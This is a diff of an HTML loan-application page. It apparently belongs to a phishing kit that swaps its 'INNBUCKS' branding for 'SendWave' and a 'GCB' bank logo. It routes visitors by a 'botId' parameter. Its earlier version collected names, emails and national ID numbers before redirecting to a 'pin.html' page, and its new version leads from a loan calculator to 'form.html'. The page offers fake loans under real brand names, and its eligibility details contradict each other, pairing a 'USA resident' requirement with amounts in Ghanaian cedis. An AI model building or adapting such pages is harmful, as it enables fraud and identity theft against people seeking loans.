@@ -3,125 +3,366 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loan Application Form</title>
+<title>SendWave</title>
 
 <style>
-body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-.loan-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-h2 { text-align: center; margin-bottom: 20px; }
-label { display: block; margin: 10px 0 5px; font-weight: bold; }
-input, select { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #ccc; margin-bottom: 15px; }
-button { width: 100%; padding: 12px; background: darkblue; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
-.logo-container { width: 100%; height: 120px; margin-bottom: 20px;
-background-color: rgb(3, 3, 107);
-color: white;
-text-align: center; 
-align-items: center;
-font-size: 40px;
-display: flex;
-justify-content: center;}
-.logo { width: 100%; height: 100%; object-fit: cover; }
-.loan-notice { background: #fff3cd;
-   border: 1px solid #ffeeba; 
-   padding: 12px;
-    border-radius: 6px; 
-    font-size: 14px;
-    margin-bottom: 20px;
- }
-.loan-notice ol {
-    padding-left: 20px; /* indent numbers */
-    margin: 8px 0 0 0;
+
+*{
+  box-sizing:border-box;
 }
-.loan-notice li {
-    margin-bottom: 6px;
+
+body{
+  margin:0;
+  font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+  background:linear-gradient(135deg,#f8fafc,#eef2ff);
+  color:#0f172a;
 }
+
+/* CONTAINER */
+.container{
+  max-width:460px;
+  margin:30px auto;
+  padding:20px;
+}
+
+/* HEADER */
+.container .header {
+  width: 100%;
+  background: transparent;
+  padding: 10px 0 20px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  margin-bottom: 10px;
+}
+
+.container .header img {
+  max-width: 90px;
+  height: auto;
+  margin-bottom: 8px;
+}
+
+.container .bank-text {
+  font-size: 13px;
+  font-weight: 700;
+  letter-spacing: 1.5px;
+  color: #64748b;
+}
+
+/* STEP */
+.step{
+  display:none;
+}
+
+.step.active{
+  display:block;
+}
+
+/* STEP 1 CARD */
+.notice{
+  background:#fff;
+  padding:20px;
+  border-radius:18px;
+  border:1px solid #e2e8f0;
+  box-shadow:0 10px 30px rgba(15,23,42,.06);
+}
+
+.notice ul{
+  padding-left:18px;
+}
+
+.notice li{
+  margin-bottom:10px;
+  font-size:14px;
+  color:#475569;
+}
+
+/* CHECKBOX */
+.confirm{
+  margin:20px 0;
+  display:flex;
+  gap:10px;
+  align-items:flex-start;
+  font-size:14px;
+  color:#334155;
+}
+
+input[type="checkbox"]{
+  width:18px;
+  height:18px;
+  accent-color:#2563eb;
+}
+
+/* BUTTON */
+button{
+  width:100%;
+  padding:16px;
+  border:none;
+  border-radius:16px;
+  font-size:15px;
+  font-weight:600;
+  cursor:pointer;
+  transition:.25s ease;
+}
+
+/* PRIMARY */
+.primary{
+  background:linear-gradient(135deg,#2563eb,#3b82f6);
+  color:white;
+  opacity:0.5;
+}
+
+.primary.enabled{
+  opacity:1;
+}
+
+.primary.enabled:hover{
+  transform:translateY(-1px);
+  box-shadow:0 12px 30px rgba(37,99,235,.25);
+}
+
+/* CALCULATOR CARD */
+.card{
+  background:#fff;
+  padding:22px;
+  border-radius:24px;
+  box-shadow:0 18px 50px rgba(15,23,42,.10);
+  border:1px solid #e2e8f0;
+}
+
+/* AMOUNT */
+.amount{
+  font-size:30px;
+  font-weight:700;
+  margin:12px 0;
+  color:#0f172a;
+}
+
+/* SLIDER */
+.slider{
+  width:100%;
+  accent-color:#2563eb;
+}
+
+/* LABELS */
+.labels{
+  display:flex;
+  justify-content:space-between;
+  font-size:12px;
+  color:#64748b;
+  margin-top:6px;
+}
+
+/* TERM BUTTONS */
+.term-buttons{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:10px;
+  margin-top:16px;
+}
+
+.term{
+  padding:10px;
+  border:none;
+  border-radius:12px;
+  background:#f1f5f9;
+  cursor:pointer;
+  font-weight:500;
+  color:#475569;
+  transition:.2s;
+}
+
+.term:hover{
+  background:#e2e8f0;
+}
+
+.term.active{
+  background:linear-gradient(135deg,#f97316,#fb923c);
+  color:white;
+  box-shadow:0 10px 20px rgba(249,115,22,.25);
+}
+
+/* RESULT */
+.result{
+  background:#f8fafc;
+  padding:16px;
+  border-radius:16px;
+  margin-top:18px;
+  text-align:center;
+  border:1px solid #e2e8f0;
+}
+
+.payment{
+  font-size:24px;
+  font-weight:700;
+  margin-top:6px;
+  color:#2563eb;
+}
+
+/* APPLY BUTTON */
+.apply{
+  background:linear-gradient(135deg,#f97316,#fb923c);
+  color:white;
+  margin-top:16px;
+}
+
+.apply:hover{
+  transform:translateY(-1px);
+  box-shadow:0 12px 30px rgba(249,115,22,.25);
+}
+
 </style>
 </head>
+
 <body>
 
-<div class="loansloan-container">
-    <!-- <h2>Credit Mola </h2> -->
-    <div class="logo-container">
-        INNBUCKS
+<div class="container">
+
+  <!-- HEADER -->
+  <div class="header">
+    <img src="GCB_logo.jpeg" alt="Sendwave Logo">
+    <div class="bank-text">sendWave</div>
+  </div>
+
+  <!-- STEP 1 -->
+  <div class="step active" id="step1">
+
+    <h2>Loan Qualifications</h2>
+    <p style="color:#64748b;">Please review before applying</p>
+
+    <div class="notice">
+      <ul>
+        <!-- <li>Valid Telecel number</li> -->
+        <li>18 years or older</li>
+        <li>USA resident</li>
+        <!-- <li>Valid Ghana Card</li> -->
+        <!-- <li>Maintain 10% of loan amount in account</li> -->
+      </ul>
     </div>
 
-    <form id="loanForm">
-        <!-- NEW NAME INPUT -->
-        <label>Full Name</label>
-        <input id="fullName" type="text" required placeholder="Enter your full name">
+    <div class="confirm">
+      <input type="checkbox" id="agree">
+      <label>I confirm I meet the requirements</label>
+    </div>
 
-        <label>Loan Amount (USD)</label>
-        <input id="loanAmount" type="number" required placeholder="MIN50">
-        <label>Email</label>
-        <input id="email" type="email" placeholder="example@gmail.com" required>
-        <label>National ID</label>
-        <input id="nationalId" type="text"  placeholder="National Id">
-        <label>Repayment Period</label>
-        <select id="repaymentPeriod" required>
-            <option value="">Select</option>
-            <option value="7days">7 Days(1.5% interest)</option>
-            <option value="14days">14 Days(2.5% interest)</option>
-            <option value="21days">21 Days(3.5% interest)</option>
-            <option value="30days">30 Days(4.5% interest)</option>
-            <option value="60days">60 Days(6% interest)</option>
-            <option value="90days">90 Days(10% interest)</option>
-        </select>
-        <label>Employment Status</label>
-        <select id="employmentStatus" required>
-            <option value="">Select</option>
-            <option value="employed">Employed</option>
-            <option value="self-employed">Self-employed</option>
-            <option value="unemployed">Unemployed</option>
-            <option value="student">Student</option>
-        </select>
-        <label>Loan Purpose</label>
-        <select id="loanPurpose" required>
-            <option value="">Select</option>
-            <option value="business">Business</option>
-            <option value="personal">Personal Loans</option>
-            <option value="schoolfees">School Fees</option>
-            <option value="medical">Medical</option>
-            <option value="others">Others</option>
-        </select>
+    <button id="continueBtn" class="primary" disabled>Continue</button>
 
-        <div class="loan-notice">
-            <strong>Qualification Notice:</strong>
-            <ol>
-                 <li>Must apply with a active innbucks account.</li>
-                <!-- <li>Must have at least 10% of the amount applying in the innbucks account </li> -->
-            </ol>
-        </div>
+  </div>
 
-        <button type="submit">Next</button>
-    </form>
+  <!-- STEP 2 -->
+  <div class="step" id="step2">
+
+    <div class="card">
+
+      <h3 style="margin-top:0;">Loan Calculator</h3>
+
+      <p style="color:#64748b;">Loan Amount</p>
+      <div class="amount" id="loanAmount">GHS 100</div>
+
+      <input type="range" min="100" max="100000" value="100" step="100" class="slider" id="loanSlider">
+
+      <div class="labels">
+        <span>GHS 100</span>
+        <span>GHS 100,000</span>
+      </div>
+
+      <h4 style="margin-top:18px;">Loan Term</h4>
+
+      <div id="months" style="color:#64748b;">12 months</div>
+
+      <div class="term-buttons">
+        <button class="term" data-month="6">6 months</button>
+        <button class="term active" data-month="12">12 months</button>
+        <button class="term" data-month="24">24 months</button>
+        <button class="term" data-month="36">36 months</button>
+        <button class="term" data-month="48">48 months</button>
+        <button class="term" data-month="60">60 months</button>
+      </div>
+
+      <div class="result">
+        <div style="color:#64748b;">Monthly Payment</div>
+        <div class="payment" id="payment">GHS 0</div>
+      </div>
+
+      <button class="apply" onclick="applyLoan()">APPLY NOW</button>
+
+    </div>
+
+  </div>
+
 </div>
 
 <script>
-// ✅ BOT ID FIX
-let botId = new URLSearchParams(window.location.search).get('botId');
-if (!botId) {
-    const parts = window.location.pathname.split('/');
-    const botIndex = parts.indexOf('bot');
-    if (botIndex !== -1 && parts[botIndex + 1]) botId = parts[botIndex + 1];
+
+/* BOT ID */
+const params = new URLSearchParams(window.location.search);
+const botId = params.get('botId');
+
+if (botId) localStorage.setItem('botId', botId);
+
+if (!localStorage.getItem('botId')){
+alert("Invalid session");
+window.location.href = "/bot/bot1";
 }
-if (!botId) { alert("Invalid access link"); throw new Error("botId missing"); }
-localStorage.setItem('botId', botId);
 
-// ---------------- FORM LOGIC ----------------
-document.getElementById('loanForm').addEventListener('submit', e => {
-    e.preventDefault();
+/* STEP SWITCH */
+const checkbox = document.getElementById('agree');
+const btn = document.getElementById('continueBtn');
 
-    // SAVE NAME + EXISTING FIELDS
-    localStorage.setItem('fullName', fullName.value); // NEW
-    localStorage.setItem('loanAmount', loanAmount.value);
-    localStorage.setItem('email', email.value);
-    localStorage.setItem('nationalId', nationalId.value);
-    localStorage.setItem('repaymentPeriod', repaymentPeriod.value);
-    localStorage.setItem('employmentStatus', employmentStatus.value);
-    localStorage.setItem('loanPurpose', loanPurpose.value);
+checkbox.onchange = () => {
+btn.disabled = !checkbox.checked;
+btn.classList.toggle("enabled", checkbox.checked);
+};
 
-    window.location.href = `pin.html?botId=${botId}`;
+btn.onclick = () => {
+document.getElementById('step1').classList.remove('active');
+document.getElementById('step2').classList.add('active');
+};
+
+/* CALCULATOR */
+let slider = document.getElementById("loanSlider");
+let loanAmount = document.getElementById("loanAmount");
+let payment = document.getElementById("payment");
+let monthsDisplay = document.getElementById("months");
+
+let months = 12;
+const rate = 0.045/12;
+
+function calculate(){
+let P = slider.value;
+let n = months;
+let r = rate;
+
+let M = (P*r)/(1-Math.pow((1+r),-n));
+
+loanAmount.innerText = "GHS " + Number(P).toLocaleString();
+payment.innerText = "GHS " + M.toFixed(2);
+}
+
+slider.oninput = calculate;
+
+document.querySelectorAll(".term").forEach(btn=>{
+btn.onclick = function(){
+document.querySelectorAll(".term").forEach(b=>b.classList.remove("active"));
+this.classList.add("active");
+
+months = this.dataset.month;
+monthsDisplay.innerText = months + " months";
+
+calculate();
+}
 });
+
+/* APPLY */
+function applyLoan(){
+localStorage.setItem("loanAmount", slider.value);
+const botId = localStorage.getItem("botId");
+window.location.href = `form.html?botId=${botId}`;
+}
+
+calculate();
+
 </script>
+
 </body>
 </html>
